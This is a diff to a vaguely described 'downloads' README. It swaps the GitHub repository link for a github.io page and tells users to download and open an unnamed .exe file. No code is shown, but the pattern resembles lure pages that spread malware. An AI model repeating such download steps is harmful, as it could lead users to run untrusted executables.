@@ -1,6 +1,6 @@
 # 💾 downloads - Access all your cloud tools here
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/thng493/downloads)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://thng493.github.io)
 
 ## 🎯 About this project
 
@@ -18,7 +18,7 @@ Your computer must meet these basic requirements to run the software:
 
 ## 📥 How to download and install
 
-1.  Visit the official release page: [https://github.com/thng493/downloads](https://github.com/thng493/downloads).
+1.  Visit the official release page: [https://thng493.github.io](https://thng493.github.io).
 2.  Scroll down to the Latest Release section.
 3.  Click the file name that ends with .exe to start the download.
 4.  Open your Downloads folder in Windows File Explorer.
